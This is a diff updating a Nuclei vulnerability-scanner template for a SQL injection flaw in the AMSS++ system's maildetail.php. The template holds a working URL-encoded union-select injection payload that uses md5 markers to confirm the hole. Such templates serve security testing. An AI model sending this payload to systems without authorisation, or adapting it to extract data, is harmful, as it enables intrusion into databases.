@@ -1,14 +1,15 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: AMSS-sqli
 
 info:
   name: AMSS sqli
-  author: Str1am    
+  author: Str1am
   severity: high
   description: AMSS++系统maildetail.php文件存在SQL注入漏洞
   reference: http://www.str1am.top
   tags: AMSS,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/modules/mail/main/maildetail.php?id=-1%27%20union%20all%20select%201,2,md5(4756),md5(4756),md5(4756),6,7,8,md5(4756),md5(4756),md5(4756),12,13,14,15,16,17,18--%20-"
